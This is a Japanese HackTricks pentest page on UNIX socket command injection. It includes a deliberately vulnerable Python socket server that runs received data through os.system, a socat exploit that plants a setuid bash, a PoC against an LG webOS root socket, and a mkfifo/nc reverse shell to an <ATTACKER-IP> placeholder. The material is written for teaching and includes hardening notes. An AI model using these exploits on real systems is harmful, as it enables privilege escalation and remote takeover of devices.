# Socket Command Injection

{{#include ../../banners/hacktricks-training.md}}

## Socket binding example with Python

次の例では、**unix socket が作成されます**（`/tmp/socket_test.s`）そして**受信した**すべてが `os.system` によって**実行されます**。現実の環境でこれを見つけることはないとわかっていますが、この例の目的は unix sockets を使うコードがどのように見えるか、そして最悪のケースで入力をどのように扱うかを確認することです。
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**実行** そのコードを python で実行する: `python s.py` と **socket がどのように待ち受けているかを確認する**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## 事例研究: Root-owned UNIX socket signal-triggered escalation (LG webOS)

一部の privileged daemons は、untrusted input を受け付け、privileged actions を thread-IDs と signals に結びつける root-owned UNIX socket を公開しています。protocol が unprivileged client によってどの native thread がターゲットになるかを左右できる場合、privileged code path を trigger して escalate できる可能性があります。

観察されたパターン:
- root-owned socket（例: /tmp/remotelogger）に接続する。
- thread を作成し、その native thread id (TID) を取得する。
- TID（packed）と padding をリクエストとして送信し、acknowledgement を受け取る。
- その TID に特定の signal を送って privileged behaviour を trigger する。

最小限の PoC スケッチ:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
これを root shell に変えるには、単純な named-pipe + nc パターンを使用できます:
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
ノート:
- このクラスのバグは、非特権クライアント状態（TIDs）から派生した値を信用し、それらを特権のシグナルハンドラやロジックに結びつけることから生じます。
- socket 上で認証情報を強制し、メッセージ形式を検証し、特権操作を外部から提供されたスレッド識別子から切り離すことで強化します。

## 参考文献

- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)

{{#include ../../banners/hacktricks-training.md}}
